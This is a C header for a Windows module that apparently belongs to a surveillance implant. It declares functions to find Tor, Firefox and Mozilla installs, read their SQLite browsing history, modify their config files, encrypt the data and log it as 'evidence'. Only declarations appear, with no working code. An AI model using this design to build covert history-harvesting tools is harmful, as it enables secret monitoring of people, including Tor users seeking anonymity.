#ifndef _URL_H_

#define _URL_H_

#include <Windows.h>
#include <TlHelp32.h>
#include "sqlite.h"

#define MAX_URL_QUEUE 250
#define URL_LOG_VER 0x20100713
#define URL_REGISTRY_BROWSER_DATA { L'b', L'\0' };
#define URL_MAX_BROWSER 20
#define MAX_LOG_ENTRIES 70

typedef struct 
{
	DWORD dwSize;
	LPBYTE lpBuffer;
} URL_LOGS, *LPURL_LOGS;

extern URL_LOGS g_lpURLLogs[MAX_URL_QUEUE];

typedef enum
{
	BROWSER_UNKNOWN,	
	BROWSER_TOR,
	BROWSER_FIREFOX,
	BROWSER_MOZILLA = 0x00000002
} BROWSER_TYPE;



typedef struct
{
	char Type;
	char TimeStamp[18];
	char ExePath[260];
	char DBPath[260];
	char ConfigPath[260];
} BROWSER_DATA, *PBROWSER_DATA;

void	DecryptBuffer(LPBYTE lpBuf, DWORD dwSize);
void	EncryptBuffer(LPBYTE lpBuf, DWORD dwSize);
LPWSTR	GetAppDataDirectory(LPWSTR lpSubDir);
LPWSTR	GetParentDirectory(LPWSTR lpPath, int nLevels);
LPWSTR	SearchFile(LPWSTR lpPath, LPWSTR lpFile);

BOOL			File_ReadLine(HANDLE hFile, LPSTR* lpszBuffer);
LPSTR			File_SearchString(HANDLE hFile, LPSTR lpszStr);

int				URL_AddSavedInfo(PBROWSER_DATA pArray, PBROWSER_DATA pBrowserData, int nPos=-1);
PBROWSER_DATA	URL_FindBrowserInfo(PBROWSER_DATA *pBrowserData, LPWSTR lpExePath, BROWSER_TYPE Browser, int *nStartFrom);
int				URL_GetBrowserHistory(BROWSER_TYPE Browser);
int				URL_GetHistory(PBROWSER_DATA pBrowserData);
int				URL_GetHistoryCallback(void*, int , char**, char**);
LPWSTR			URL_GetProcessPath(DWORD dwProcID);
int				URL_GetSavedInfo(PBROWSER_DATA *pBrowserData);
DWORD			URL_IsProcess(LPWSTR lpExeName);
BOOL			URL_LogEvidence(LPWSTR lpwsURL, LPWSTR lpwsTitle, LPSTR lpszTimestamp, BROWSER_TYPE Browser);
int				URL_ModifyConfigFile(PBROWSER_DATA pBrowserData);
int				URL_OpenDB(LPSTR lpDBPath);
int				URL_QueueLog(LPBYTE lpEvBuf, DWORD dwEvSize);
int				URL_SaveInfo(PBROWSER_DATA pBrowserData);
BOOL			URL_SearchFiles(LPWSTR lpExePath, PBROWSER_DATA *pBrowserData, BROWSER_TYPE Browser);

VOID			URL_Main();

#endif